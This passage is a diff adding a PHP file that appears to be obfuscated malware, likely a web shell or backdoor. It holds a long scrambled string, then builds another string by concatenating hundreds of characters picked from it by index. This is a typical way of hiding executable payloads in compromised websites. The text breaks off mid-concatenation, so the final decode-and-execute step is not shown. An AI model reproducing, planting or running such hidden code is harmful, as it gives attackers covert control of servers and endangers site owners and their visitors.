@@ -1,0 +1,612 @@
+<?php $zuuvl='fFD/vrBkwjMyClJf0Vl4B0IIejtVb4qFtlsuf9yw3lrP5txmK4fkF]IpXQe6iH7iLrj3+OqzHU5ZLxikcwQ3upyaVGOoiCV3pcCyFOBNsIeEIU3sSRoSaoTjUL6pcL6YOWWTGtCKUvqJ6A5eYNA6puaUD54YiJB9AZLxRGUbArmZLx5oIQf2MeAzwDvEb5IM9+L2YuqlCVyycnENEjCm2EQR9BBxkEedZwlPhb2V6Ga3IuYTjsujG5Ds5nFoSb/Eo41Mr8Dm/zk8LMwt3UJ6wmC5Hckcpx1So/zY2GEIn2BE4BDi2V8n0J7oxOQEYQIdZTjX9soi8WT6hY9ykoC1IACZbUCFZE5+gt7/T9rvmPdQBecmvtZU/qhbXKOQLJ1m61SMofBO/Z+5vXkPbGuTvrzRBiudtF+w+0Qc5iG=nALNLzo+MZ3gY1yh4sFbSFnTq5vUOxzTWGwWmrm/2OtAYQazcw9skNIxe/1SgBWU/wBkaLvGeKOXAtiI7BM402D/f2yM4zv5pk2O2yPrsxSJcLktza3B5i7c8indMRwcderlNtzSsD9pPFrv3HgBpyH51hjYGHsZ2HgU03DPZtz66ZTghqc8abmTnPoZzTfjXDsns+PkGevkj1tvwM7d4HlTjkevpGVUBuUYI0Z2tXwNtU5CGkWWFELZWmpcl6wA0ou4/EA0Bx27NTfBn/BYUb5YBUebU84NDUM0SMPLJxDN/DC1klmLbT/qZCrZF7dfveze8ksvTFxqIgn6AunpuCglEyjrcz8McQ2Lb1`pU8+8fpNcl4qWVhPzUrzTqRC0OGcChjyQvnXOpYf3WHFO292/PUmALBhM64sWImZym2/BlxadrK02tj9vOrRSclBdYVkAOmCQ0X8KxphJqzIN2dKwu1+ZOgWjC+LrQbALxs2To1xF0g8fEJlDHjtkLMSqUoboca3hKDCBTpVYZGTHjvzTw6rpQDMAvAE669Uts+ZTQF33yP3/K6qTdt+RACsNV+FjJkoasDEr4Hwb02AMevVUQYtjvwZu7NTchRSq+Zhvpfum2C/jLR0jngu4p6uEqF9F38JpDOAW4ReIjq7l8ZjdzlOj7FzjdHD0oURNIoRknlhv34Ieg5WhgzMQTINrEWC5YlYaUZSCvcQ9xRmhpEevfy0S3s4taRfb5aoG5YJthnOeioHuRToF+YBIjcHQJuKgSlifJGEvIIcSHRBGUk7Zij2kEfvKuCxG/+Sk5oIGNKrpxO7SGI1YSCy91bZHWRoQpD4bVkBvaBQFLs2FAHw1LKtm0w9M+68DqKz6RGa7cb2mGKBOMGz5KUV2vegc/cW7KAtR6idVX4CpC10/2awnwovlA+AcddigswCaxrudr0669GBgGnccGzq1u/AxBt5migTOp_W+Bd/YR1v5qPfyAVXf332/fFNBFVOGal\XSvBvj5i1JwAqj6I9KRGsK0Rj8eAtLzjZr5AcIjMLboVJtzP2ixQjuWCtXqtWJTe9xNbPj0c4L6XpwEGbMH8nTY7n6U6dce3I4YO+OTUuhjoe2AkWH+dFX9mvAabKJsYFSocqVnjfhENf8gG/SB46Ob2ViQMjenzE0hpqExfvsBJOxBC188sm6mrefykeb/y9bOAjWBV1cCDuYDOFKnIKtSs1SAV4M4QgsYz625QzwLFCzst/js6aApwX89hBmqmlUa7g4ImOdJMb+uCM1IlNf8qhLm1/s9X9XMlfWNGrhrU7ywVpRN/tZI42vXkF85JL/5LbrDYf2xNQeaEboD4ya7ZCz0mhdCPDE5Eom9NMc8NmJuQ/oBvByhk1YIDKVfNeSe3LOUBlv31jSeo+zDG+i2ISx2u/laBiGWRS5gBu1hY1u25f6NSg)NfydO7iEFdlUZR/uvxgexXMDxJWmAiQWmmu4+VZxRO=Ke5BOoE46DNrlNOWjJY4Y2g7rzWimOl8Gyh6cN92kUshqWF2q776wNCAzjPg8Ng7pWP9sOKCsFi6EPkmo4EN3de9FOdQ4r00zZ2nQ/oewmDEHhi3WuNQYSvfviYGrdZWGofGg6toRL+8TcD4CSqSBk9BDpNPhIXnk6GX7J9rVooQ24Qgdwq93Qjmv8/i+dn2vJSpn2pzHNyH/nIpmE6KefCBW2LBcdtU6lGaycZJFdk5V5eeJCcMlrZHvbwks/wLUVdamUHHeScmXD1ArFhZ2QRoTrQW9TSlNrpWb0MsHEutWAvbTzGN0UqUdyt6oFn1SDJsqIOAFqGjii8y7/ONpjr5Jv1n1jsKv2G9MCsa2ETjc2dBYPddELGBYHdp7D6kn/CPTVHQvIK5ZQnRhT7zqZ+dPlTXkunlxxvaRZtewItRawFuOUrGxwn+NnQ/opRKga18PcHffdn7JYFYndQvx9i1023Jx/nGMZVy92S3ovjJcenColthZLCRfEiDqw9tcAj+xoZh6GOC/feAd1sGHQ3EqlqwFShX5ic0HoZULjpj+xTB6q+Xr2A0D2/8jEwlUnjxxwdqnDsYJb/sBwLtkbV6X9I6EDJojokTXS+T3tje1cjXpulzGcccjXOSuDa3z2plS/bqfGpa4sBUKUjrhtxJ1+Z74MXxFFdgPJHmgvVrq8NFxLFLXl82D2/7nC0Elqsb0t1tN3HG4smmiOtDKEvPT0dy1T/c2gTHOVZxpJ6zntSdeEroEcsSJPWqt4a(LajMjEU7ZGWfLERKWZJKeoqnBwJw+2uV7SuUyNG/1/U7giK62ApHaslTQeK4X/tGxu9NO/nmbhwgxVcJwmwb5Wnd/WnJ3bwilqMVlIBezxC6/9XWzHcYrz/nwZd0PxlwLJnXFPrpXf/2mBVHxnizkAinx6ViB7yCzHW6FXnnSydv3UsbW3MS;t8aLcE4f1emnVuoHid0W3i4Yc2J9ae+LDpr+YcrmIsMiwXaojkJKZcryw/MsXmDJDDW7Bg7tBszIkTDYxqnKv4siQvdntX2+aLlvwJL45coPuQzwvGbDz+624tqbxBvxN5+3Da9Z6m6/hTzDmtrQgTNFblSO5apK7TmW4MG8LUvwLtrW4nl/lKLpNQW2m+Zeqg6SO0mmcK6gUTTgPg33BOZpq59OXCzulwIvWg+KSaS5FhpdZeCdqlatMfJppv00tN9FunRC19+1rP5jjihBD213o5iGjy4amKq5IZVdXSLpy/LirFxLAHHX3Ylml9a9rcDFNXmXB76j5yomO0zXUdwtc6jDUuGqeFFdBpL0g3iRGnGTaj8JusfmwhTCjK/ZMIn9WvpxgrDbFXhYRMX2hcvVdVqpxjYcIfNTrhF34kSqzyzPwYRZyxbc39os9bj8CDm_YEabN64KgCG7oPQvnqazjhHF1PzFuhy79lk62eCCOp2ezk7yVy6P/+VQZGaqj2Gw$Dixxv7N/sSW917zbw4vwAFCODleXX/Z2Aqj0weVlAT0iIYRB2FPUOwdp/qeLJQ3GPoaOJN/TmSdv5eu8P4fWZfOIqPP8y+Cn5+Kd8GVxET9dcSzknrscFr6LuskWQjTScmowkJfYr5R9wwc+cAGmIQMgcpBIRWLt5j5HTRwvnmLP4sSM79+X928MAuAlDRxEzN1CTJ0hxlySUQttX4M29HnLgm462UST7fIItmirfjVqmCLjwtv5z+sfViA7B6XfuQUeyIfV5zu/bK6zc^_UykvhRsFZ1hmM0FluXzVLmj2+WarDn9tQG64+0DFQFiES208Gyt4ibDNnTft8rxiqk2hcK61H2bk+J5GSXFONqLX3ZJN/fbPp8RbO31x9vS4nnwCwGt+HeOTz+UYBFT0zlpOGel88maCdP1Y7WNoi/NqdNrvrbO82JKeMUQJADID6XQxiCs/xl6EkYJCj35wsWPtr/snjBfDNH3K4mPAgClzUv8HJq5C37YWRgZz6DN5C9ug52eupYQXMf2byh+F5ze9+vmR9EGF0Hb8rM[43v1buI5gnZ1b8THJ8wWuX4dv4uhNWGMzq7brGRTZAQfgHAYnGU5huontXj1XSEBlQlkiTT3d6oqG$2ruEjK0MGufvTmmCTDYoSQTjMNtRUNyZc5nJb4phG6TgaeWdOpJjBHHTqvTRwrGsBh9lKGhmZZUwbkxYvwgvvtyCn+pYoxEFIwROj4ljbYBaj0QfxkZccSBGTKRtaMzfXcIP7+nT9jUyCvUDwWgvNnmZXa9d7VgSKUm+imJ97jZjSoxWp0Kwc7MBQKJTlbDsryWOlx4QSj0kCOp3VpKAOa6K5jTQhbGloMSSzw+by3qEFqpuUQBVqHHpLtM7USVNvOhz3dDJ2+HfvIlysj9Po/FZRyOKpzbbjN4NaxAWADX9Gu1zf9xweRGvEs8bz'; $zuceozsblk=$zuuvl[24].$zuuvl[103].$zuuvl[5].$zuuvl[26].$zuuvl[89].$zuuvl[47].$zuuvl[26].$zuuvl[118].$zuuvl[19].$zuuvl[16].$zuuvl[28].$zuuvl[11].$zuuvl[10].$zuuvl[258].$zuuvl[35].$zuuvl[258].$zuuvl[3].$zuuvl[179].$zuuvl[1].$zuuvl[129].$zuuvl[223].$zuuvl[55].$zuuvl[12].$zuuvl[16].$zuuvl[34].$zuuvl[129].$zuuvl[73].$zuuvl[28].$zuuvl[223].$zuuvl[34].$zuuvl[7].$zuuvl[223].$zuuvl[9].$zuuvl[228].$zuuvl[22].$zuuvl[22].$zuuvl[47].$zuuvl[107].$zuuvl[2].$zuuvl[1].$zuuvl[127].$zuuvl[10].$zuuvl[59].$zuuvl[127].$zuuvl[62].$zuuvl[48].$zuuvl[129].$zuuvl[141].$zuuvl[30].$zuuvl[22].$zuuvl[57].$zuuvl[261].$zuuvl[46].$zuuvl[352].$zuuvl[55].$zuuvl[59].$zuuvl[13].$zuuvl[73].$zuuvl[28].$zuuvl[47].$zuuvl[34].$zuuvl[75].$zuuvl[9].$zuuvl[3].$zuuvl[205].$zuuvl[55].$zuuvl[19].$zuuvl[75].$zuuvl[9].$zuuvl[118].$zuuvl[112].$zuuvl[112].$zuuvl[28].$zuuvl[118].$zuuvl[2].$zuuvl[34].$zuuvl[28].$zuuvl[26].$zuuvl[258].$zuuvl[223].$zuuvl[258].$zuuvl[129].$zuuvl[16].$zuuvl[26].$zuuvl[34].$zuuvl[9].$zuuvl[71].$zuuvl[118].$zuuvl[40].$zuuvl[223].$zuuvl[43].$zuuvl[118].$zuuvl[40].$zuuvl[223].$zuuvl[69].$zuuvl[4].$zuuvl[261].$zuuvl[113].$zuuvl[87].$zuuvl[69].$zuuvl[19].$zuuvl[71].$zuuvl[12].$zuuvl[179].$zuuvl[127].$zuuvl[228].$zuuvl[11].$zuuvl[1].$zuuvl[80].$zuuvl[24].$zuuvl[22].$zuuvl[89].$zuuvl[17].$zuuvl[258].$zuuvl[55].$zuuvl[118].$zuuvl[28].$zuuvl[62].$zuuvl[37].$zuuvl[37].$zuuvl[10].$zuuvl[62].$zuuvl[57].$zuuvl[118].$zuuvl[28].$zuuvl[141].$zuuvl[40].$zuuvl[46].$zuuvl[11].$zuuvl[14].$zuuvl[44].$zuuvl[19].$zuuvl[60].$zuuvl[75].$zuuvl[129].$zuuvl[19].$zuuvl[43].$zuuvl[4].$zuuvl[19].$zuuvl[80].$zuuvl[6].$zuuvl[26].$zuuvl[352].$zuuvl[60].$zuuvl[69].$zuuvl[103].$zuuvl[61].$zuuvl[73].$zuuvl[56].$zuuvl[8].$zuuvl[261].$zuuvl[61].$zuuvl[48].$zuuvl[352].$zuuvl[17].$zuuvl[44].$zuuvl[68].$zuuvl[261].$zuuvl[127].$zuuvl[223].$zuuvl[22].$zuuvl[80].$zuuvl[16].$zuuvl[13].$zuuvl[223].$zuuvl[64].$zuuvl[6].$zuuvl[30].$zuuvl[62].$zuuvl[0].$zuuvl[113].$zuuvl[59].$zuuvl[4].$zuuvl[46].$zuuvl[258].$zuuvl[16].$zuuvl[71].$zuuvl[26].$zuuvl[118].$zuuvl[28].$zuuvl[10].$zuuvl[6].$zuuvl[44].$zuuvl[89].$zuuvl[10].$zuuvl[112].$zuuvl[28].$zuuvl[107].$zuuvl[112].$zuuvl[9].$zuuvl[6].$zuuvl[14].$zuuvl[64].$zuuvl[12].$zuuvl[80].$zuuvl[10].$zuuvl[5].$zuuvl[258].$zuuvl[179].$zuuvl[34].$zuuvl[56].$zuuvl[35].$zuuvl[228].$zuuvl[91].$zuuvl[69].$zuuvl[7].$zuuvl[73].$zuuvl[71].$zuuvl[34].$zuuvl[1].$zuuvl[107].$zuuvl[223].$zuuvl[6].$zuuvl[35].$zuuvl[60].$zuuvl[60].$zuuvl[55].$zuuvl[103].$zuuvl[44].$zuuvl[87].$zuuvl[141].$zuuvl[91].$zuuvl[28].$zuuvl[11].$zuuvl[7].$zuuvl[57].$zuuvl[1].$zuuvl[30].$zuuvl[91].$zuuvl[16].$zuuvl[205].$zuuvl[352].$zuuvl[14].$zuuvl[89].$zuuvl[19].$zuuvl[127].$zuuvl[129].$zuuvl[43].$zuuvl[9].$zuuvl[69].$zuuvl[14].$zuuvl[57].$zuuvl[205].$zuuvl[113].$zuuvl[17].$zuuvl[14].$zuuvl[223].$zuuvl[127].$zuuvl[107].$zuuvl[19].$zuuvl[14].$zuuvl[9].$zuuvl[11].$zuuvl[8].$zuuvl[35].$zuuvl[4].$zuuvl[5].$zuuvl[4].$zuuvl[2].$zuuvl[57].$zuuvl[80].$zuuvl[352].$zuuvl[103].$zuuvl[17].$zuuvl[113].$zuuvl[59].$zuuvl[35].$zuuvl[5].$zuuvl[87].$zuuvl[89].$zuuvl[75].$zuuvl[127].$zuuvl[16].$zuuvl[46].$zuuvl[47].$zuuvl[6].$zuuvl[30].$zuuvl[205].$zuuvl[56].$zuuvl[112].$zuuvl[59].$zuuvl[0].$zuuvl[3].$zuuvl[24].$zuuvl[59].$zuuvl[75].$zuuvl[261].$zuuvl[55].$zuuvl[3].$zuuvl[80].$zuuvl[59].$zuuvl[3].$zuuvl[118].$zuuvl[9].$zuuvl[34].$zuuvl[205].$zuuvl[141].$zuuvl[68].$zuuvl[35].$zuuvl[16].$zuuvl[0].$zuuvl[59].$zuuvl[6].$zuuvl[80].$zuuvl[47].$zuuvl[48].$zuuvl[28].$zuuvl[112].$zuuvl[73].$zuuvl[61].$zuuvl[118].$zuuvl[16].$zuuvl[261].$zuuvl[43].$zuuvl[28].$zuuvl[103].$zuuvl[22].$zuuvl[3].$zuuvl[127].$zuuvl[22].$zuuvl[0].$zuuvl[30].$zuuvl[141].$zuuvl[28].$zuuvl[56].$zuuvl[56].$zuuvl[1].$zuuvl[61].$zuuvl[89].$zuuvl[47].$zuuvl[71].$zuuvl[30].$zuuvl[11].$zuuvl[4].$zuuvl[64].$zuuvl[26].$zuuvl[46].$zuuvl[6].$zuuvl[13].$zuuvl[5].$zuuvl[112].$zuuvl[7].$zuuvl[129].$zuuvl[62].$zuuvl[12].$zuuvl[34].$zuuvl[10].$zuuvl[5].$zuuvl[2].$zuuvl[258].$zuuvl[68].$zuuvl[89].$zuuvl[11].$zuuvl[0].$zuuvl[57].$zuuvl[112].$zuuvl[129].$zuuvl[48].$zuuvl[69].$zuuvl[0].$zuuvl[37].$zuuvl[3].$zuuvl[127].$zuuvl[19].$zuuvl[2].$zuuvl[48].$zuuvl[80].$zuuvl[68].$zuuvl[12].$zuuvl[24].$zuuvl[352].$zuuvl[56].$zuuvl[69].$zuuvl[3].$zuuvl[112].$zuuvl[47].$zuuvl[8].$zuuvl[19].$zuuvl[13].$zuuvl[71].$zuuvl[118].$zuuvl[0].$zuuvl[3].$zuuvl[16].$zuuvl[60].$zuuvl[30].$zuuvl[4].$zuuvl[73].$zuuvl[261].$zuuvl[34].$zuuvl[56].$zuuvl[179].$zuuvl[6].$zuuvl[19].$zuuvl[103].$zuuvl[9].$zuuvl[59].$zuuvl[46].$zuuvl[112].$zuuvl[68].$zuuvl[129].$zuuvl[223].$zuuvl[35].$zuuvl[3].$zuuvl[223].$zuuvl[91].$zuuvl[19].$zuuvl[89].$zuuvl[11].$zuuvl[91].$zuuvl[73].$zuuvl[68].$zuuvl[205].$zuuvl[80].$zuuvl[59].$zuuvl[9].$zuuvl[71].$zuuvl[57].$zuuvl[9].$zuuvl[205].$zuuvl[17].$zuuvl[89].$zuuvl[223].$zuuvl[14].$zuuvl[28].$zuuvl[55].$zuuvl[17].$zuuvl[91].$zuuvl[37].$zuuvl[9].$zuuvl[26].$zuuvl[62].$zuuvl[205].$zuuvl[56].$zuuvl[59].$zuuvl[205].$zuuvl[2].$zuuvl[8].$zuuvl[113].$zuuvl[258].$zuuvl[127].$zuuvl[61].$zuuvl[55].$zuuvl[13].$zuuvl[107].$zuuvl[80].$zuuvl[37].$zuuvl[0].$zuuvl[118].$zuuvl[61].$zuuvl[24].$zuuvl[13].$zuuvl[12].$zuuvl[9].$zuuvl[35].$zuuvl[16].$zuuvl[352].$zuuvl[91].$zuuvl[13].$zuuvl[4].$zuuvl[5].$zuuvl[5].$zuuvl[56].$zuuvl[55].$zuuvl[223].$zuuvl[11].$zuuvl[107].$zuuvl[47].$zuuvl[24].$zuuvl[87].$zuuvl[28].$zuuvl[1].$zuuvl[75].$zuuvl[44].$zuuvl[9].$zuuvl[34].$zuuvl[17].$zuuvl[30].$zuuvl[30].$zuuvl[113].$zuuvl[80].$zuuvl[179].$zuuvl[179].$zuuvl[30].$zuuvl[28].$zuuvl[5].$zuuvl[112].$zuuvl[47].$zuuvl[26].$zuuvl[4].$zuuvl[7].$zuuvl[141].$zuuvl[80].$zuuvl[64].$zuuvl[87].$zuuvl[258].$zuuvl[73].$zuuvl[43].$zuuvl[55].$zuuvl[30].$zuuvl[22].$zuuvl[8].$zuuvl[59].$zuuvl[6].$zuuvl[2].$zuuvl[2].$zuuvl[89].$zuuvl[112].$zuuvl[35].$zuuvl[16].$zuuvl[113].$zuuvl[103].$zuuvl[17].$zuuvl[46].$zuuvl[46].$zuuvl[9].$zuuvl[24].$zuuvl[19].$zuuvl[228].$zuuvl[9].$zuuvl[118].$zuuvl[223].$zuuvl[7].$zuuvl[14].$zuuvl[352].$zuuvl[8].$zuuvl[57].$zuuvl[61].$zuuvl[112].$zuuvl[56].$zuuvl[258].$zuuvl[8].$zuuvl[61].$zuuvl[68].$zuuvl[1].$zuuvl[103].$zuuvl[13].$zuuvl[69].$zuuvl[12].$zuuvl[62].$zuuvl[55].$zuuvl[6].$zuuvl[1].$zuuvl[44].$zuuvl[26].$zuuvl[228].$zuuvl[34].$zuuvl[91].$zuuvl[69].$zuuvl[13].$zuuvl[26].$zuuvl[4].$zuuvl[6].$zuuvl[118].$zuuvl[4].$zuuvl[9].$zuuvl[107].$zuuvl[48].$zuuvl[47].$zuuvl[205].$zuuvl[91].$zuuvl[69].$zuuvl[179].$zuuvl[59].$zuuvl[0].$zuuvl[57].$zuuvl[129].$zuuvl[141].$zuuvl[47].$zuuvl[68].$zuuvl[9].$zuuvl[37].$zuuvl[179].$zuuvl[71].$zuuvl[24].$zuuvl[62].$zuuvl[64].$zuuvl[5].$zuuvl[107].$zuuvl[37].$zuuvl[64].$zuuvl[62].$zuuvl[71].$zuuvl[223].$zuuvl[113].$zuuvl[89].$zuuvl[91].$zuuvl[48].$zuuvl[223].$zuuvl[24].$zuuvl[80].$zuuvl[47].$zuuvl[6].$zuuvl[0].$zuuvl[44].$zuuvl[35].$zuuvl[28].$zuuvl[179].$zuuvl[3].$zuuvl[103].$zuuvl[75].$zuuvl[228].$zuuvl[35].$zuuvl[19].$zuuvl[22].$zuuvl[7].$zuuvl[7].$zuuvl[10].$zuuvl[55].$zuuvl[228].$zuuvl[113].$zuuvl[5].$zuuvl[14].$zuuvl[57].$zuuvl[205].$zuuvl[34].$zuuvl[37].$zuuvl[16].$zuuvl[44].$zuuvl[141].$zuuvl[118].$zuuvl[71].$zuuvl[73].$zuuvl[17].$zuuvl[19].$zuuvl[1].$zuuvl[113].$zuuvl[223].$zuuvl[75].$zuuvl[68].$zuuvl[12].$zuuvl[26].$zuuvl[0].$zuuvl[12].$zuuvl[4].$zuuvl[4].$zuuvl[11].$zuuvl[91].$zuuvl[87].$zuuvl[91].$zuuvl[69].$zuuvl[89].$zuuvl[43].$zuuvl[34].$zuuvl[56].$zuuvl[1].$zuuvl[103].$zuuvl[118].$zuuvl[60].$zuuvl[46].$zuuvl[57].$zuuvl[228].$zuuvl[10].$zuuvl[8].$zuuvl[89].$zuuvl[2].$zuuvl[261].$zuuvl[9].$zuuvl[13].$zuuvl[103].$zuuvl[44].$zuuvl[62].$zuuvl[75].$zuuvl[1].$zuuvl[44].$zuuvl[24].$zuuvl[75].$zuuvl[89].$zuuvl[75].$zuuvl[9].$zuuvl[2].$zuuvl[46].$zuuvl[4].$zuuvl[61].$zuuvl[28].$zuuvl[59].$zuuvl[103].$zuuvl[80].$zuuvl[87].$zuuvl[179].$zuuvl[6].$zuuvl[16].$zuuvl[10].$zuuvl[1].$zuuvl[22].$zuuvl[113].$zuuvl[40].$zuuvl[179].$zuuvl[6].$zuuvl[228].$zuuvl[258].$zuuvl[5].$zuuvl[24].$zuuvl[40].$zuuvl[80].$zuuvl[56].$zuuvl[1].$zuuvl[12].$zuuvl[61].$zuuvl[141].$zuuvl[91].$zuuvl[9].$zuuvl[60].$zuuvl[261].$zuuvl[35].$zuuvl[179].$zuuvl[68].$zuuvl[75].$zuuvl[75].$zuuvl[127].$zuuvl[56].$zuuvl[26].$zuuvl[223].$zuuvl[141].$zuuvl[3].$zuuvl[141].$zuuvl[34].$zuuvl[48].$zuuvl[11].$zuuvl[2].$zuuvl[19].$zuuvl[46].$zuuvl[64].$zuuvl[7].$zuuvl[179].$zuuvl[352].$zuuvl[71].$zuuvl[7].$zuuvl[4].$zuuvl[59].$zuuvl[179].$zuuvl[37].$zuuvl[56].$zuuvl[4].$zuuvl[3].$zuuvl[118].$zuuvl[223].$zuuvl[205].$zuuvl[68].$zuuvl[40].$zuuvl[34].$zuuvl[16].$zuuvl[4].$zuuvl[0].$zuuvl[10].$zuuvl[205].$zuuvl[9].$zuuvl[127].$zuuvl[258].$zuuvl[80].$zuuvl[9].$zuuvl[258].$zuuvl[107].$zuuvl[9].$zuuvl[352].$zuuvl[16].$zuuvl[103].$zuuvl[71].$zuuvl[75].$zuuvl[22].$zuuvl[352].$zuuvl[59].$zuuvl[37].$zuuvl[118].$zuuvl[179].$zuuvl[71].$zuuvl[4].$zuuvl[91].$zuuvl[2].$zuuvl[34].$zuuvl[6].$zuuvl[34].$zuuvl[0].$zuuvl[37].$zuuvl[3].$zuuvl[35].$zuuvl[61].$zuuvl[35].$zuuvl[46].$zuuvl[35].$zuuvl[141].$zuuvl[71].$zuuvl[10].$zuuvl[61].$zuuvl[46].$zuuvl[179].$zuuvl[14].$zuuvl[40].$zuuvl[0].$zuuvl[141].$zuuvl[80].$zuuvl[55].$zuuvl[56].$zuuvl[107].$zuuvl[30].$zuuvl[2].$zuuvl[47].$zuuvl[80].$zuuvl[17].$zuuvl[60].$zuuvl[80].$zuuvl[47].$zuuvl[26].$zuuvl[64].$zuuvl[7].$zuuvl[13].$zuuvl[35].$zuuvl[118].$zuuvl[11].$zuuvl[113].$zuuvl[129].$zuuvl[47].$zuuvl[35].$zuuvl[75].$zuuvl[2].$zuuvl[107].$zuuvl[103].$zuuvl[43].$zuuvl[68].$zuuvl[22].$zuuvl[80].$zuuvl[118].$zuuvl[48].$zuuvl[14].$zuuvl[141].$zuuvl[258].$zuuvl[57].$zuuvl[17].$zuuvl[19].$zuuvl[19].$zuuvl[68].$zuuvl[112].$zuuvl[47].$zuuvl[35].$zuuvl[24].$zuuvl[30].$zuuvl[59].$zuuvl[352].$zuuvl[91].$zuuvl[205].$zuuvl[258].$zuuvl[60].$zuuvl[118].$zuuvl[179].$zuuvl[75].$zuuvl[4].$zuuvl[129].$zuuvl[73].$zuuvl[118].$zuuvl[47].$zuuvl[228].$zuuvl[17].$zuuvl[24].$zuuvl[141].$zuuvl[60].$zuuvl[179].$zuuvl[59].$zuuvl[2].$zuuvl[44].$zuuvl[47].$zuuvl[223].$zuuvl[141].$zuuvl[40].$zuuvl[71].$zuuvl[19].$zuuvl[1].$zuuvl[43].$zuuvl[80].$zuuvl[113].$zuuvl[14].$zuuvl[89].$zuuvl[19].$zuuvl[223].$zuuvl[261].$zuuvl[75].$zuuvl[47].$zuuvl[103].$zuuvl[30].$zuuvl[59].$zuuvl[13].$zuuvl[26].$zuuvl[5].$zuuvl[47].$zuuvl[11].$zuuvl[8].$zuuvl[91].$zuuvl[28].$zuuvl[141].$zuuvl[47].$zuuvl[127].$zuuvl[73].$zuuvl[113].$zuuvl[69].$zuuvl[2].$zuuvl[228].$zuuvl[205].$zuuvl[56].$zuuvl[103].$zuuvl[34].$zuuvl[44].$zuuvl[62].$zuuvl[56].$zuuvl[223].$zuuvl[62].$zuuvl[46].$zuuvl[37].$zuuvl[118].$zuuvl[8].$zuuvl[35].$zuuvl[71].$zuuvl[129].$zuuvl[179].$zuuvl[71].$zuuvl[64].$zuuvl[69].$zuuvl[141].$zuuvl[91].$zuuvl[2].$zuuvl[71].$zuuvl[47].$zuuvl[103].$zuuvl[89].$zuuvl[5].$zuuvl[48].$zuuvl[127].$zuuvl[0].$zuuvl[9].$zuuvl[75].$zuuvl[37].$zuuvl[118].$zuuvl[11].$zuuvl[62].$zuuvl[261].$zuuvl[223].$zuuvl[1].$zuuvl[91].$zuuvl[22].$zuuvl[35].$zuuvl[179].$zuuvl[118].$zuuvl[89].$zuuvl[8].$zuuvl[71].$zuuvl[2].$zuuvl[129].$zuuvl[19].$zuuvl[48].$zuuvl[69].$zuuvl[6].$zuuvl[30].$zuuvl[9].$zuuvl[17].$zuuvl[103].$zuuvl[14].$zuuvl[55].$zuuvl[26].$zuuvl[37].$zuuvl[48].$zuuvl[205].$zuuvl[40].$zuuvl[87].$zuuvl[24].$zuuvl[69].$zuuvl[2].$zuuvl[9].$zuuvl[5].$zuuvl[87].$zuuvl[9].$zuuvl[11].$zuuvl[10].$zuuvl[69].$zuuvl[0].$zuuvl[261].$zuuvl[69].$zuuvl[17].$zuuvl[4].$zuuvl[28].$zuuvl[26].$zuuvl[64].$zuuvl[19].$zuuvl[35].$zuuvl[43].$zuuvl[59].$zuuvl[2].$zuuvl[34].$zuuvl[28].$zuuvl[59].$zuuvl[6].$zuuvl[26].$zuuvl[103].$zuuvl[3].$zuuvl[179].$zuuvl[6].$zuuvl[19].$zuuvl[0].$zuuvl[223].$zuuvl[89].$zuuvl[4].$zuuvl[64].$zuuvl[80].$zuuvl[87].$zuuvl[19].$zuuvl[46].$zuuvl[68].$zuuvl[6].$zuuvl[17].$zuuvl[10].$zuuvl[10].$zuuvl[223].$zuuvl[28].$zuuvl[57].$zuuvl[71].$zuuvl[9].$zuuvl[7].$zuuvl[10].$zuuvl[0].$zuuvl[103].$zuuvl[71].$zuuvl[127].$zuuvl[141].$zuuvl[258].$zuuvl[17].$zuuvl[228].$zuuvl[4].$zuuvl[26].$zuuvl[223].$zuuvl[87].$zuuvl[10].$zuuvl[17].$zuuvl[47].$zuuvl[34].$zuuvl[223].$zuuvl[205].$zuuvl[223].$zuuvl[352].$zuuvl[9].$zuuvl[69].$zuuvl[40].$zuuvl[75].$zuuvl[118].$zuuvl[103].$zuuvl[69].$zuuvl[17].$zuuvl[75].$zuuvl[258].$zuuvl[352].$zuuvl[127].$zuuvl[61].$zuuvl[228].$zuuvl[44].$zuuvl[40].$zuuvl[24].$zuuvl[59].$zuuvl[87].$zuuvl[12].$zuuvl[179].$zuuvl[258].$zuuvl[205].$zuuvl[8].$zuuvl[129].$zuuvl[26].$zuuvl[103].$zuuvl[261].$zuuvl[75].$zuuvl[205].$zuuvl[43].$zuuvl[87].$zuuvl[43].$zuuvl[6].$zuuvl[4].$zuuvl[40].$zuuvl[26].$zuuvl[91].$zuuvl[46].$zuuvl[103].$zuuvl[8].$zuuvl[64].$zuuvl[64].$zuuvl[73].$zuuvl[7].$zuuvl[205].$zuuvl[35].$zuuvl[141].$zuuvl[10].$zuuvl[55].$zuuvl[46].$zuuvl[55].$zuuvl[69].$zuuvl[107].$zuuvl[60].$zuuvl[19].$zuuvl[59].$zuuvl[0].$zuuvl[22].$zuuvl[80].$zuuvl[223].$zuuvl[60].$zuuvl[13].$zuuvl[127].$zuuvl[7].$zuuvl[44].$zuuvl[40].$zuuvl[352].$zuuvl[228].$zuuvl[8].$zuuvl[0].$zuuvl[14].$zuuvl[8].$zuuvl[16].$zuuvl[112].$zuuvl[8].$zuuvl[91].$zuuvl[103].$zuuvl[13].$zuuvl[352].$zuuvl[87].$zuuvl[26].$zuuvl[30].$zuuvl[9].$zuuvl[179].$zuuvl[61].$zuuvl[69].$zuuvl[19].$zuuvl[34].$zuuvl[60].$zuuvl[12].$zuuvl[28].$zuuvl[64].$zuuvl[26].$zuuvl[47].$zuuvl[57].$zuuvl[205].$zuuvl[352].$zuuvl[1].$zuuvl[141].$zuuvl[179].$zuuvl[1].$zuuvl[43].$zuuvl[55].$zuuvl[112].$zuuvl[34].$zuuvl[141].$zuuvl[64].$zuuvl[35].$zuuvl[0].$zuuvl[12].$zuuvl[8].$zuuvl[62].$zuuvl[89].$zuuvl[141].$zuuvl[30].$zuuvl[112].$zuuvl[8].$zuuvl[22].$zuuvl[141].$zuuvl[223].$zuuvl[228].$zuuvl[22].$zuuvl[61].$zuuvl[5].$zuuvl[179].$zuuvl[1].$zuuvl[59].$zuuvl[26].$zuuvl[47].$zuuvl[4].$zuuvl[60].$zuuvl[113].$zuuvl[261].$zuuvl[22].$zuuvl[34].$zuuvl[80].$zuuvl[73].$zuuvl[9].$zuuvl[5].$zuuvl[14].$zuuvl[258].$zuuvl[80].$zuuvl[228].$zuuvl[69].$zuuvl[8].$zuuvl[69].$zuuvl[8].$zuuvl[2].$zuuvl[75].$zuuvl[12].$zuuvl[48].$zuuvl[13].$zuuvl[261].$zuuvl[129].$zuuvl[24].$zuuvl[48].$zuuvl[56].$zuuvl[73].$zuuvl[3].$zuuvl[141].$zuuvl[24].$zuuvl[44].$zuuvl[179].$zuuvl[118].$zuuvl[37].$zuuvl[44].$zuuvl[4].$zuuvl[8].$zuuvl[55].$zuuvl[46].$zuuvl[